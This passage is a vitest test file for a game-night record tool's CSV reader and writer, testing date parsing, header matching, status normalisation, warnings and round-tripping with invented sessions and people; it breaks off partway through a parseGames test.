import { describe, expect, it } from 'vitest';
import {
  appendGames,
  appendSessions,
  formatCsv,
  gamesToCsv,
  parseCsv,
  parseDate,
  parseGames,
  parseSessions,
  sessionsToCsv,
} from './record.ts';
import { AUTO_SOURCE, type GameInfo, type SessionRow } from './types.ts';

// Everything here is made up: invented sessions ("GN1"…), people and dates. Only the game titles are real.

const SESSIONS_HEADER = 'Session,Date,Start,Status,Games,Planned,Cost,Announced by,Source,Notes';
const GAMES_HEADER = 'Game,Style,Mode,Where,Link,Tags,Developer';

const sessions: SessionRow[] = [
  {
    session: 'GN1',
    date: '2031-01-04',
    start: '10:30am',
    status: 'Played',
    games: ['Among Us'],
    planned: [],
    cost: 'Free',
    announcedBy: 'Robin',
    source: '#announcements',
    notes: 'The first one, a "trial run", went well',
  },
  { date: '2031-01-11', status: 'No session', games: [], planned: [] },
  {
    session: 'GN2',
    date: '2031-01-18',
    start: '11am',
    status: 'Played',
    games: ['Stick Fight: The Game', 'Golf With Your Friends'],
    planned: ['Gang Beasts'],
    cost: '$2.99',
    notes: 'Servers were down,\nso we switched after ten minutes',
  },
  { date: '2031-01-25', status: 'Cancelled', games: [], planned: ['Pico Park'], source: AUTO_SOURCE },
  { session: 'Winter special', date: '2031-02-01', status: 'Special', games: ['Jackbox Party Pack 3'], planned: [] },
];

const games: GameInfo[] = [
  {
    name: 'Among Us',
    style: 'Social deduction',
    mode: 'Competitive',
    where: 'Steam',
    link: 'https://store.steampowered.com/app/945360/',
    tags: ['Multiplayer', 'Online Co-Op', 'Space'],
    developer: 'Innersloth',
  },
  { name: 'Gartic Phone', where: 'Browser', link: 'http://garticphone.com/', tags: [] },
  { name: 'Keep Talking and Nobody Explodes', mode: 'Co-op', tags: ['Puzzle'], developer: 'Steel Crate Games' },
  { name: 'Pico Park', tags: [] },
];

describe('parseCsv', () => {
  it('reads plain rows, with or without a final newline', () => {
    expect(parseCsv('a,b,c\n1,2,3\n')).toEqual([
      ['a', 'b', 'c'],
      ['1', '2', '3'],
    ]);
    expect(parseCsv('a,b,c\n1,2,3')).toEqual([
      ['a', 'b', 'c'],
      ['1', '2', '3'],
    ]);
  });

  it('reads quoted cells: commas, escaped quotes and line breaks', () => {
    const text = 'name,note\n"Stick Fight, the game","He said ""gg""\nand left"\n"","""quoted"""\n';
    expect(parseCsv(text)).toEqual([
      ['name', 'note'],
      ['Stick Fight, the game', 'He said "gg"\nand left'],
      ['', '"quoted"'],
    ]);
  });

  it.each([
    ['LF', 'a,b\n1,2\n3,4\n'],
    ['CRLF', 'a,b\r\n1,2\r\n3,4\r\n'],
    ['lone CR', 'a,b\r1,2\r3,4\r'],
    ['a mix', 'a,b\r\n1,2\r3,4\n'],
  ])('splits rows at %s', (_name, text) => {
    expect(parseCsv(text)).toEqual([
      ['a', 'b'],
      ['1', '2'],
      ['3', '4'],
    ]);
  });

  it('keeps a line break inside quotes as it was written', () => {
    expect(parseCsv('"one\r\ntwo",x\r\n')).toEqual([['one\r\ntwo', 'x']]);
  });

  it('strips a leading byte order mark, also before a quoted cell', () => {
    expect(parseCsv('\uFEFFa,b\n1,2\n')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ]);
    expect(parseCsv('\uFEFF"a,b",c\n')).toEqual([['a,b', 'c']]);
  });

  it('drops rows whose cells are all empty', () => {
    expect(parseCsv('a,b\n\n,\n  \n"",""\n1,2\n\n\n')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ]);
    expect(parseCsv('')).toEqual([]);
    expect(parseCsv(' \r\n\n')).toEqual([]);
  });

  it('keeps empty cells and whitespace inside a row', () => {
    expect(parseCsv('a,,c,\n ,x, y \n')).toEqual([
      ['a', '', 'c', ''],
      [' ', 'x', ' y '],
    ]);
  });

  it('treats a quote that is not at the start of a cell as plain text', () => {
    expect(parseCsv('5" disk,say "hi"\n')).toEqual([['5" disk', 'say "hi"']]);
  });

  it('reads to the end of the text when a quote is never closed', () => {
    expect(parseCsv('a,"b\nc,d')).toEqual([['a', 'b\nc,d']]);
  });

  it('reads a single cell, and a quoted cell that ends the text', () => {
    expect(parseCsv('x')).toEqual([['x']]);
    expect(parseCsv('a,"b"')).toEqual([['a', 'b']]);
    expect(parseCsv('"a ""b"""')).toEqual([['a "b"']]);
    expect(parseCsv('"a,\nb"')).toEqual([['a,\nb']]);
  });

  it('keeps emoji, accents and non-Latin text as written', () => {
    expect(parseCsv('名前,メモ\n"Pokémon 🎮, Legends",«привет»\n🎲,\n')).toEqual([
      ['名前', 'メモ'],
      ['Pokémon 🎮, Legends', '«привет»'],
      ['🎲', ''],
    ]);
  });

  it('only strips a byte order mark at the very start', () => {
    expect(parseCsv('a,b\n\uFEFFc,d\n')).toEqual([
      ['a', 'b'],
      ['\uFEFFc', 'd'],
    ]);
  });

  it('reads a long file and a very long cell', () => {
    const lines = Array.from({ length: 20_000 }, (_, i) => `GN${i},"week ${i}, ""fun"""\n`);
    const rows = parseCsv(`n,note\n${lines.join('')}`);
    expect(rows).toHaveLength(20_001);
    expect(rows[20_000]).toEqual(['GN19999', 'week 19999, "fun"']);

    const long = 'ab,"\n'.repeat(60_000);
    expect(parseCsv(formatCsv([['x', long, 'y']]))).toEqual([['x', long, 'y']]);
  });
});

describe('formatCsv', () => {
  it('quotes a cell only when it needs it', () => {
    const row = ['plain', 'a,b', 'say "hi"', 'two\nlines', 'old\rmac', ' leading', 'trailing ', 'in side', ''];
    expect(formatCsv([row])).toBe('plain,"a,b","say ""hi""","two\nlines","old\rmac"," leading","trailing ",in side,\n');
  });

  it('quotes a cell with a tab or a line break at either end', () => {
    expect(formatCsv([['\tx', 'x\t', 'a\tb', '\n', 'x\r']])).toBe('"\tx","x\t",a\tb,"\n","x\r"\n');
  });

  it('ends every row with the line ending asked for', () => {
    const rows = [
      ['a', 'b'],
      ['1', '2'],
    ];
    expect(formatCsv(rows)).toBe('a,b\n1,2\n');
    expect(formatCsv(rows, '\r\n')).toBe('a,b\r\n1,2\r\n');
    expect(formatCsv([])).toBe('');
  });

  it.each(['\n', '\r\n'] as const)('round-trips awkward cells through parseCsv (eol %j)', (eol) => {
    const rows = [
      ['Game', 'Notes', 'More'],
      ['Stick Fight, the game', '"quoted" and\nmulti-line\r\ntext', ' padded '],
      ['', 'x', '"'],
      [',', '""', '\t'],
    ];
    expect(parseCsv(formatCsv(rows, eol))).toEqual(rows);
  });
});

describe('parseDate', () => {
  it.each([
    ['2031-03-09', '2031-03-09'],
    ['2031-3-9', '2031-03-09'],
    ['2031/03/09', '2031-03-09'],
    ['2031/3/9', '2031-03-09'],
    ['3/9/2031', '2031-03-09'],
    ['03/09/2031', '2031-03-09'],
    ['3/9/31', '2031-03-09'],
    ['03/09/31', '2031-03-09'],
    ['12/31/2030', '2030-12-31'],
    ['11/5/07', '2007-11-05'],
    ['  2031-03-09  ', '2031-03-09'],
    ['\t3/9/2031\n', '2031-03-09'],
    // Two-digit years are always 20YY.
    ['1/1/00', '2000-01-01'],
    ['12/31/99', '2099-12-31'],
    ['2/29/24', '2024-02-29'],
    // Year end, and the weekends the clocks change (a date is never turned into a moment in time).
    ['2031-12-31', '2031-12-31'],
    ['1/1/2032', '2032-01-01'],
    ['3/8/2031', '2031-03-08'],
    ['11/2/2031', '2031-11-02'],
    // Leap days: 2032 and 2000 have one.
    ['2032-02-29', '2032-02-29'],
    ['2/29/2000', '2000-02-29'],
    // Always four digits for the year.
    ['0987-6-5', '0987-06-05'],
  ])('reads %j as %s', (raw, expected) => {
    expect(parseDate(raw)).toBe(expected);
  });

  it.each([
    [1, 31],
    [2, 28],
    [3, 31],
    [4, 30],
    [5, 31],
    [6, 30],
    [7, 31],
    [8, 31],
    [9, 30],
    [10, 31],
    [11, 30],
    [12, 31],
  ])('reads the last day of month %i, the %ith, and no day after it', (month, days) => {
    const mm = String(month).padStart(2, '0');
    expect(parseDate(`2031-${mm}-${days}`)).toBe(`2031-${mm}-${days}`);
    expect(parseDate(`${month}/${days}/2031`)).toBe(`2031-${mm}-${days}`);
    expect(parseDate(`${month}/${days}/31`)).toBe(`2031-${mm}-${days}`);
    expect(parseDate(`2031-${mm}-${days + 1}`)).toBeUndefined();
    expect(parseDate(`2031/${month}/${days + 1}`)).toBeUndefined();
    expect(parseDate(`${month}/${days + 1}/2031`)).toBeUndefined();
    expect(parseDate(`${mm}/${days + 1}/31`)).toBeUndefined();
  });

  it.each([
    '',
    '   ',
    'Saturday',
    '2031-02-30',
    '2031-02-29', // not a leap year
    '2/29/2100', // divisible by 100 but not 400
    '2031-04-31',
    '2031-13-01',
    '2031-00-10',
    '2031-01-00',
    '13/45/2031',
    '31/12/2031', // day first: there is no month 31
    '6/31/2031',
    '0/5/2031',
    '2031-03',
    '3/9',
    '3/9/031',
    '3/9/20311',
    '2031-03/09',
    '3-9-2031',
    '2031-03-09T10:30',
    '2031-03-09 10:30',
    'March 9, 2031',
    '20310309',
    '2/29/23',
    '2/30/2032',
    '2031-3-9-1',
    '3/9/2031/1',
    '3/9/-31',
    '2031 03 09',
    '2031.03.09',
    '+2031-03-09',
    '-2031-03-09',
    "'2031-03-09",
    '1e3-01-01',
    '45000', // a spreadsheet's serial number for a date
    '２０３１-０３-０９', // full-width digits
    '٢٠٣١-٠٣-٠٩', // Arabic-Indic digits
    // A date with something in front of it or after it is not a date.
    'x3/9/2031',
    '103/9/2031',
    'on 2031-03-09',
    '12031-03-09',
    '3/9/2031x',
    '2031-03-099',
    '2031-03-09 (moved)',
  ])('rejects %j', (raw) => {
    expect(parseDate(raw)).toBeUndefined();
  });
});

describe('parseSessions', () => {
  it('reads a file with the canonical header', () => {
    const text =
      `${SESSIONS_HEADER}\n` +
      'GN7,2031-05-03,10:30am,Played,Among Us; Gartic Phone,,Free,Robin,#announcements,"Two games, back to back"\n' +
      ',2031-05-10,,No session,,,,Robin,#announcements,Robin was away\n';
    expect(parseSessions(text)).toStrictEqual({
      rows: [
        {
          session: 'GN7',
          date: '2031-05-03',
          start: '10:30am',
          status: 'Played',
          games: ['Among Us', 'Gartic Phone'],
          planned: [],
          cost: 'Free',
          announcedBy: 'Robin',
          source: '#announcements',
          notes: 'Two games, back to back',
        },
        {
          date: '2031-05-10',
          status: 'No session',
          games: [],
          planned: [],
          announcedBy: 'Robin',
          source: '#announcements',
          notes: 'Robin was away',
        },
      ],
      notes: [],
    });
  });

  it('gives back what sessionsToCsv wrote', () => {
    expect(parseSessions(sessionsToCsv(sessions))).toStrictEqual({ rows: sessions, notes: [] });
  });

  it('leaves out the properties of empty cells instead of setting them to undefined', () => {
    const { rows } = parseSessions(`${SESSIONS_HEADER}\n,2031-05-10, ,No session,,,  ,,,\n`);
    expect(rows).toStrictEqual([{ date: '2031-05-10', status: 'No session', games: [], planned: [] }]);
  });

  it('finds columns by name: any order, any case, extra and missing columns', () => {
    const text =
      'notes, GAMES ,Attendance,date,session,Host\n' +
      'Fun,Pico Park,7,2031-06-07,GN9,Sam\n' +
      ',Gang Beasts,5,2031-06-14,GN10,Sam\n';
    expect(parseSessions(text)).toStrictEqual({
      rows: [
        { session: 'GN9', date: '2031-06-07', status: 'Played', games: ['Pico Park'], planned: [], notes: 'Fun' },
        { session: 'GN10', date: '2031-06-14', status: 'Played', games: ['Gang Beasts'], planned: [] },
      ],
      notes: [],
    });
  });

  it('accepts the header spellings of older exports', () => {
    const text =
      'EG,Date,Start (PT),Status,Game(s) played,Planned instead,Cost at the time,Announced by,Source,Notes\n' +
      'GN3,2031-02-08,10:30am,Played,Pico Park,Gang Beasts,$4.99,Robin,#announcements,Swapped late\n';
    expect(parseSessions(text).rows).toStrictEqual([
      {
        session: 'GN3',
        date: '2031-02-08',
        start: '10:30am',
        status: 'Played',
        games: ['Pico Park'],
        planned: ['Gang Beasts'],
        cost: '$4.99',
        announcedBy: 'Robin',
        source: '#announcements',
        notes: 'Swapped late',
      },
    ]);
    expect(parseSessions('Date,Game(s)\n2031-02-08,Pico Park\n').rows[0]?.games).toEqual(['Pico Park']);
  });

  it('reads the first column when two have the same meaning', () => {
    const { rows } = parseSessions('Date,Start,Start (ET)\n2031-02-08,10:30am,1:30pm\n');
    expect(rows[0]?.start).toBe('10:30am');
  });

  it('only needs a Date column', () => {
    expect(parseSessions('Date\n2031-02-08\n')).toStrictEqual({
      rows: [{ date: '2031-02-08', status: 'No session', games: [], planned: [] }],
      notes: [],
    });
  });

  it('reads nothing, with one warning, when there is no Date column', () => {
    const result = parseSessions('Session,When,Games\nGN1,2031-01-04,Among Us\n');
    expect(result.rows).toEqual([]);
    expect(result.notes).toHaveLength(1);
    expect(result.notes[0]?.kind).toBe('warning');
    expect(result.notes[0]?.text).toMatch(/sessions\.csv.*no "Date" column/);
  });

  it.each(['', '   ', '\n\n', '\uFEFF', ' \r\n\t\r\n'])('reads nothing from an empty file (%j)', (text) => {
    expect(parseSessions(text)).toEqual({ rows: [], notes: [] });
  });

  it('reads a header with no rows under it', () => {
    expect(parseSessions(`${SESSIONS_HEADER}\n`)).toEqual({ rows: [], notes: [] });
  });

  it('reads dates a spreadsheet rewrote', () => {
    const text = 'Session,Date\nGN1,1/4/2031\nGN2,01/11/31\nGN3,2031/1/18\nGN4,2031-01-25\n';
    const dates = parseSessions(text).rows.map((row) => row.date);
    expect(dates).toEqual(['2031-01-04', '2031-01-11', '2031-01-18', '2031-01-25']);
  });

  it.each([
    ['Played', 'Played'],
    ['played', 'Played'],
    ['CANCELLED', 'Cancelled'],
    ['Canceled', 'Cancelled'],
    ['canceled', 'Cancelled'],
    ['No session', 'No session'],
    ['no  SESSION', 'No session'],
    ['No EG', 'No session'],
    ['Off', 'No session'],
    ['skipped', 'No session'],
    ['Special', 'Special'],
    ['  special ', 'Special'],
  ])('reads the status %j as %s', (raw, expected) => {
    const { rows, notes } = parseSessions(`Session,Date,Status\nGN1,2031-01-04,${raw}\n`);
    expect(rows[0]?.status).toBe(expected);
    expect(notes).toEqual([]);
  });

  it('fills in a blank status: Played if the row names a session or a game, otherwise No session', () => {
    const text =
      'Session,Date,Status,Games,Planned,Notes\n' +
      'GN1,2031-01-04,,,,\n' +
      ',2031-01-11,,Pico Park,,\n' +
      ',2031-01-18,,,,Holiday\n' +
      ',2031-01-25,,,Gang Beasts,Nobody could make it\n';
    expect(parseSessions(text).rows.map((row) => row.status)).toEqual(['Played', 'Played', 'No session', 'No session']);
  });

  it('skips a row with an unknown status, with a warning', () => {
    const { rows, notes } = parseSessions('Session,Date,Status\nGN1,2031-01-04,Played\nGN2,2031-01-11,Maybe\n');
    expect(rows.map((row) => row.session)).toEqual(['GN1']);
    expect(notes).toEqual([
      { kind: 'warning', text: 'sessions.csv line 3: can\'t read the status "Maybe", so this row was skipped.' },
    ]);
  });

  it('skips a row with an unreadable or missing date, with a warning', () => {
    const text = `${SESSIONS_HEADER}\nGN1,2031-01-04,,Played,,,,,,\nGN2,13/45/2031,,Played,,,,,,\nGN3,,,Played,,,,,,\n`;
    const { rows, notes } = parseSessions(text);
    expect(rows.map((row) => row.session)).toEqual(['GN1']);
    expect(notes).toEqual([
      { kind: 'warning', text: 'sessions.csv line 3: can\'t read the date "13/45/2031", so this row was skipped.' },
      { kind: 'warning', text: 'sessions.csv line 4: there is no date, so this row was skipped.' },
    ]);
  });

  it('writes one note for a row with two problems', () => {
    expect(parseSessions('Date,Status\nsoon,Maybe\n').notes).toHaveLength(1);
  });

  it('keeps a long or multi-line cell short in a note', () => {
    const { notes } = parseSessions(`Date\n"see\nbelow ${'x'.repeat(200)}"\n`);
    expect(notes[0]?.text).toMatch(/^sessions\.csv line 2: can't read the date "see below x+…", so this row was/);
    expect(notes[0]?.text.length).toBeLessThan(160);
  });

  it('splits Games and Planned on ";", dropping empty items and repeats', () => {
    const text =
      'Date,Games,Planned\n' +
      '2031-01-04, Among Us ;Pico Park;; Among Us;pico park ; ,Gang Beasts;Gang Beasts\n' +
      '2031-01-11,"Stick Fight: The Game; Keep Talking, and Nobody Explodes", ; \n';
    const { rows } = parseSessions(text);
    // Only exact repeats go: "pico park" is spelled differently.
    expect(rows[0]).toMatchObject({ games: ['Among Us', 'Pico Park', 'pico park'], planned: ['Gang Beasts'] });
    expect(rows[1]?.games).toEqual(['Stick Fight: The Game', 'Keep Talking, and Nobody Explodes']);
    expect(rows[1]?.planned).toEqual([]);
  });

  it('lists at most 20 skipped rows, then says how many more there were', () => {
    const badRows = (count: number) => Array.from({ length: count }, (_, i) => `GN${i + 2},someday ${i + 1}\n`);
    const file = (bad: number) => `Session,Date\nGN1,2031-01-04\n${badRows(bad).join('')}`;

    expect(parseSessions(file(20)).notes).toHaveLength(20);

    const one = parseSessions(file(21));
    expect(one.notes).toHaveLength(21);
    expect(one.notes[20]).toEqual({
      kind: 'warning',
      text: 'sessions.csv: 1 more row was skipped for the same kinds of problem.',
    });

    const many = parseSessions(file(45));
    expect(many.rows).toHaveLength(1);
    expect(many.notes).toHaveLength(21);
    expect(many.notes[0]?.text).toContain('line 3:');
    expect(many.notes[19]?.text).toContain('line 22:');
    expect(many.notes[19]?.text).toContain('"someday 20"');
    expect(many.notes[20]?.text).toBe('sessions.csv: 25 more rows were skipped for the same kinds of problem.');
  });

  it('counts lines of the file, so a note is right after a multi-line cell or a blank line', () => {
    const text =
      'Session,Date,Notes\n' + // line 1
      'GN1,2031-01-04,"three\nlines\nof notes"\n' + // lines 2-4
      '\n' + // line 5
      'GN2,2031-01-11,"two\r\nlines"\n' + // lines 6-7
      'GN3,never,\n' + // line 8
      'GN4,2031-01-25,"old\rmac"\n' + // lines 9-10
      'GN5,later,\n'; // line 11
    const { rows, notes } = parseSessions(text);
    expect(rows.map((row) => row.session)).toEqual(['GN1', 'GN2', 'GN4']);
    expect(rows[0]?.notes).toBe('three\nlines\nof notes');
    expect(notes.map((note) => note.text)).toEqual([
      'sessions.csv line 8: can\'t read the date "never", so this row was skipped.',
      'sessions.csv line 11: can\'t read the date "later", so this row was skipped.',
    ]);
  });

  it('counts lines the same way in a CRLF file with a byte order mark', () => {
    const text = '\uFEFFSession,Date,Notes\r\nGN1,2031-01-04,"a\r\nb"\r\nGN2,nope,\r\nGN3,2031-01-18,ok\r\n';
    const { rows, notes } = parseSessions(text);
    expect(rows).toStrictEqual([
      { session: 'GN1', date: '2031-01-04', status: 'Played', games: [], planned: [], notes: 'a\r\nb' },
      { session: 'GN3', date: '2031-01-18', status: 'Played', games: [], planned: [], notes: 'ok' },
    ]);
    expect(notes.map((note) => note.text)).toEqual([
      'sessions.csv line 4: can\'t read the date "nope", so this row was skipped.',
    ]);
  });

  it('sorts rows oldest first, keeping file order for rows on the same date', () => {
    const text =
      'Session,Date\n' +
      'GN5,2031-03-01\n' +
      'Late extra,2031-02-01\n' +
      'GN3,2/1/2031\n' +
      'GN1,2030-12-28\n' +
      'Evening extra,2031-02-01\n';
    const order = parseSessions(text).rows.map((row) => row.session);
    expect(order).toEqual(['GN1', 'Late extra', 'GN3', 'Evening extra', 'GN5']);
  });

  it('says so when a quote is never closed', () => {
    const { rows, notes } = parseSessions('Session,Date,Notes\nGN1,2031-01-04,"oops\nGN2,2031-01-11,\n');
    expect(rows.map((row) => row.session)).toEqual(['GN1']);
    expect(notes).toHaveLength(1);
    expect(notes[0]?.text).toMatch(/^sessions\.csv line 2: a quote .* never closed/);
  });

  it('points at the line the unclosed quote is on, not the line its row starts on', () => {
    const { notes } = parseSessions('Session,Date,Notes\n"GN\n1",2031-01-04,"oops\nGN2,2031-01-11,\n');
    expect(notes.map((note) => note.text)).toEqual([expect.stringMatching(/^sessions\.csv line 3: a quote /)]);
  });

  it('lists 20 skipped rows as well as the note about an unclosed quote', () => {
    const bad = Array.from({ length: 22 }, (_, i) => `GN${i + 1},someday ${i + 1},\n`).join('');
    const { notes } = parseSessions(`Session,Date,Notes\n${bad}GN23,2031-01-04,"oops\n`);
    expect(notes).toHaveLength(22);
    expect(notes[0]?.text).toMatch(/^sessions\.csv line 24: a quote /);
    expect(notes[20]?.text).toContain('"someday 20"');
    expect(notes[21]?.text).toBe('sessions.csv: 2 more rows were skipped for the same kinds of problem.');
  });

  it('reads any header that starts with "Start" or "Cost", but not "Status", as those columns', () => {
    const text = 'date,START TIME,cost ($),status\n2031-04-05,11am,$3,off\n';
    expect(parseSessions(text)).toStrictEqual({
      rows: [{ date: '2031-04-05', start: '11am', status: 'No session', games: [], planned: [], cost: '$3' }],
      notes: [],
    });
    expect(parseSessions('Date,Costs,Starting at\n2031-04-05,Free,noon\n').rows[0]).toMatchObject({
      cost: 'Free',
      start: 'noon',
    });
  });

  it('needs the exact name for every other column, and "Start" or "Cost" as the first word', () => {
    // None of these is a column of the record, though each one looks like one: [header, cell].
    const columns = [
      ['Dates', '2030-01-01'],
      ['Date added', '2030-02-02'],
      ['Session notes', 'GN1'],
      ['EG number', '7'],
      ['Status note', 'Maybe'],
      ['Games count', '2'],
      ['Game(s) planned', 'Pico Park'],
      ['Planned by', 'Sam'],
      ['Announced by whom', 'Robin'],
      ['Source URL', 'x'],
      ['Notes 2', 'y'],
      ['Restart', '9am'],
      ['Est. cost', '$1'],
    ];
    const lookalikes = columns.map(([header]) => header ?? '');
    const cells = columns.map(([, cell]) => cell ?? '');
    const text = formatCsv([
      [...lookalikes, 'Date'],
      [...cells, '2031-04-05'],
    ]);
    expect(parseSessions(text)).toStrictEqual({
      rows: [{ date: '2031-04-05', status: 'No session', games: [], planned: [] }],
      notes: [],
    });
    // Without the real Date column there is nothing to read.
    expect(parseSessions(formatCsv([lookalikes, cells])).rows).toEqual([]);
    expect(parseSessions(formatCsv([lookalikes, cells])).notes[0]?.text).toMatch(/no "Date" column/);
  });

  it('keeps a game that is in both Games and Planned, and in more than one row', () => {
    const text =
      'Date,Games,Planned\n' +
      '2031-01-04,Pico Park; Among Us,Among Us; Pico Park; Among Us\n' +
      '2031-01-11,Pico Park,Pico Park\n';
    expect(parseSessions(text).rows).toMatchObject([
      { games: ['Pico Park', 'Among Us'], planned: ['Among Us', 'Pico Park'] },
      { games: ['Pico Park'], planned: ['Pico Park'] },
    ]);
  });

  it('reads a header, or one row, with no line break after it', () => {
    expect(parseSessions('Date')).toEqual({ rows: [], notes: [] });
    expect(parseSessions(SESSIONS_HEADER)).toEqual({ rows: [], notes: [] });
    expect(parseSessions('Session,Date\nGN1,2031-01-04')).toStrictEqual({
      rows: [{ session: 'GN1', date: '2031-01-04', status: 'Played', games: [], planned: [] }],
      notes: [],
    });
  });

  it('quotes a cell of up to 80 characters whole in a note, and cuts a longer one there', () => {
    const note = (cell: string) => parseSessions(`Date\n${cell}\n`).notes[0]?.text;
    expect(note('x'.repeat(80))).toBe(
      `sessions.csv line 2: can't read the date "${'x'.repeat(80)}", so this row was skipped.`,
    );
    expect(note('x'.repeat(81))).toBe(
      `sessions.csv line 2: can't read the date "${'x'.repeat(80)}…", so this row was skipped.`,
    );
  });

  it('keeps rows of the same date in file order in a long file too', () => {
    // 600 rows on three dates, written newest date first.
    const dates = ['2031-03-15', '2031-03-08', '2031-03-01'];
    const lines = Array.from({ length: 600 }, (_, i) => `GN${i},${dates[i % 3]}\n`);
    const { rows } = parseSessions(`Session,Date\n${lines.join('')}`);
    const numbers = (date: string) =>
      rows.filter((row) => row.date === date).map((row) => Number(row.session?.slice(2)));
    expect(rows.map((row) => row.date)).toEqual([...dates].reverse().flatMap((date) => Array(200).fill(date)));
    for (const [offset, date] of dates.entries()) {
      expect(numbers(date)).toEqual(Array.from({ length: 200 }, (_, i) => i * 3 + offset));
    }
  });

  it('trims every cell', () => {
    const text =
      `${SESSIONS_HEADER}\n` +
      ' GN5 , 2031-07-05 ,\t11am , played ," Pico Park "," Gang Beasts ",' +
      ' Free , Robin ,  #announcements ," Short one\n"\n';
    expect(parseSessions(text)).toStrictEqual({
      rows: [
        {
          session: 'GN5',
          date: '2031-07-05',
          start: '11am',
          status: 'Played',
          games: ['Pico Park'],
          planned: ['Gang Beasts'],
          cost: 'Free',
          announcedBy: 'Robin',
          source: '#announcements',
          notes: 'Short one',
        },
      ],
      notes: [],
    });
  });

  it('keeps emoji, quotes and non-Latin text in every field', () => {
    const row: SessionRow = {
      session: '第3回 🎲',
      date: '2031-07-12',
      start: '午前10時',
      status: 'Special',
      games: ['Pokémon UNITE', 'Тетрис', '"Untitled" Goose Game, the sequel', "'Til Dawn"],
      planned: ['原神'],
      cost: '€2,99',
      announcedBy: 'Zoë 🦊',
      source: '#📢announcements',
      notes: 'Sam: "👍👍"\n(twice)',
    };
    expect(parseSessions(sessionsToCsv([row]))).toStrictEqual({ rows: [row], notes: [] });
  });

  it('does not cut an emoji in half when it shortens a cell for a note', () => {
    // The "x" puts every emoji on an odd index, so the 80th character is the first half of one.
    const { notes } = parseSessions(`Date\nx${'🎲'.repeat(60)}\n`);
    expect(notes[0]?.text.isWellFormed()).toBe(true);
    expect(notes[0]?.text).toBe(
      `sessions.csv line 2: can't read the date "x${'🎲'.repeat(39)}…", so this row was skipped.`,
    );
    // A cut between two emoji stays where it is.
    expect(parseSessions(`Date\n${'🎲'.repeat(60)}\n`).notes[0]?.text).toContain(`"${'🎲'.repeat(40)}…"`);
  });

  it('sorts by the date itself, however each row wrote it', () => {
    const text = 'Session,Date\nGN5,2032-02-29\nGN4,1/1/32\nGN3,12/31/2031\nGN2,11/2/31\nGN1,2031/3/9\n';
    expect(parseSessions(text).rows.map((row) => `${row.session} ${row.date}`)).toEqual([
      'GN1 2031-03-09',
      'GN2 2031-11-02',
      'GN3 2031-12-31',
      'GN4 2032-01-01',
      'GN5 2032-02-29',
    ]);
  });

  it.each([
    'constructor',
    '__proto__',
    'toString',
    'Cancelled (rain)',
    'No-session',
    'Played?',
    'Offline',
    'Off sick',
    'No EGs',
    'Skipped it',
    'Cancel',
    'Not played',
    'Nosession',
  ])('does not know the status %j', (status) => {
    const { rows, notes } = parseSessions(`Session,Date,Status\nGN1,2031-01-04,${status}\n`);
    expect(rows).toEqual([]);
    expect(notes).toHaveLength(1);
    expect(notes[0]?.text).toContain(`can't read the status "${status}"`);
  });

  it('skips a row with its date in the wrong column, rather than guessing', () => {
    const { rows, notes } = parseSessions('Session,Date,Notes\n2031-01-04,GN1,\n');
    expect(rows).toEqual([]);
    expect(notes[0]?.text).toBe('sessions.csv line 2: can\'t read the date "GN1", so this row was skipped.');
  });

  it('reads rows with fewer or more cells than the header', () => {
    const { rows, notes } = parseSessions('Session,Date,Notes\nGN1,2031-01-04\nGN2,2031-01-11,ok,stray,cells\n');
    expect(rows).toStrictEqual([
      { session: 'GN1', date: '2031-01-04', status: 'Played', games: [], planned: [] },
      { session: 'GN2', date: '2031-01-11', status: 'Played', games: [], planned: [], notes: 'ok' },
    ]);
    expect(notes).toEqual([]);
  });
});

describe('parseGames', () => {
  it('reads a file with the canonical header', () => {
    const text =
      `${GAMES_HEADER}\n` +
      'Among Us,Social deduction,Competitive,Steam,https://store.steampowered.com/app/945360/,' +
      '"Multiplayer, Online Co-Op, Space",Innersloth\n' +
      'Gartic Phone,,,Browser,http://garticphone.com/,,\n';
    expect(parseGames(text)).toStrictEqual({ rows: games.slice(0, 2), notes: [] });
  });

  it('gives back what gamesToCsv wrote', () => {
    expect(parseGames(gamesToCsv(games))).toStrictEqual({ rows: games, notes: [] });
  });

  it('accepts the header spellings of older exports, in any order', () => {
    const text =
      'Steam tags,NAME,Co-op or competitive,Rating,Steam link\n' +
      '"Party, Drawing",Gartic Phone,Competitive,5,https://garticphone.com/\n';
    expect(parseGames(text)).toStrictEqual({
      rows: [
        { name: 'Gartic Phone', mode: 'Competitive', link: 'https://garticphone.com/', tags: ['Party', 'Drawing'] },
      ],
      notes: [],
    });
  });

  it('drops rows without a name, silently', () => {
    const text = `${GAMES_HEADER}\n,Party,Co-op,Steam,,,\n  ,,,,,,Somebody\nPico Park,,,,,,\n`;
    expect(parseGames(text)).toStrictEqual({ rows: [{ name: 'Pico Park', tags: [] }], notes: [] });
  });

  it('splits Tags on commas, trimming and dropping empty items', () => {
    const { rows } = parseGames('Game,Tags\nPico Park," Co-op ,Puzzle,, Local Multiplayer , "\nGang Beasts,\n');
    expect(rows.map((game) => game.tags)).toEqual([['Co-op', 'Puzzle', 'Local Multiplayer'], []]);
  });

  it('splits Tags on commas only', () => {
    const { rows } = parseGames('Game,Tags\nPico Park,"Co-op; Puzzle, 2D/3D, Rogue-like | Cute"\n');
    expect(rows[0]?.tags).toEqual(['Co-op; Puzzle', '2D/3D', 'Rogue-like | Cute']);
  });

  it('needs the exact name for every column', () => {
    // None of these is a column of the file, though each one starts like one.
    const lookalikes = ['Game mode', 'Games', 'Names', 'Styles', 'Modes', 'Where to buy', 'Link text', 'Tags (old)'];
    const cells = ['Co-op', 'x', 'y', 'Puzzle', 'Party', 'Steam', 'https://example.com/', 'a, b'];
    expect(cells).toHaveLength(lookalikes.length);
    const text = formatCsv([
      [...lookalikes, 'Game'],
      [...cells, 'Pico Park'],
    ]);
    expect(parseGames(text)).toStrictEqual({ rows: [{ name: 'Pico Park', tags: [] }], notes: [] });
    // Without the real Game column there is nothing to read.
    expect(parseGames(formatCsv([lookalikes, cells])).rows).toEqual([]);
    expect(parseGames(formatCsv([lookalikes, cells])).notes[0]?.text).toMatch(/no "Game" column/);
  });

  it('reads a header, or one row, with no line break after it', () => {
    expect(parseGames('Game')).toEqual({ rows: [], notes: [] });
    expect(parseGames(`${GAMES_HEADER}\n`)).toEqual({ rows: [], notes: [] });
    expect(parseGames('Game,Style\nPico Park,Puzzle')).toStrictEqual({
      rows: [{ name: 'Pico Park', style: 'Puzzle', tags: [] }],
      notes: [],
    });
  });

  it('says so when a quote is never closed', () => {
    const { rows, notes } = parseGames('Game,Style\nPico Park,"Puzzle\nGang Beasts,Party\n');
